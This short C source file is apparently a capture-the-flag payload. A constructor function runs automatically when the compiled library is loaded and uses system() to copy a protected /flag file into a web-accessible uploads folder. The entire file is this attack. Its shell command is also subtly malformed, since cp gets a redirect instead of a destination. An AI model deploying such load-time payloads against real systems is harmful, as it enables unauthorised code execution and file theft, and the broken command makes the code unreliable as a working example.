#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void abc(){
    system("cp /flag > /app/uploads/flag.txt");
}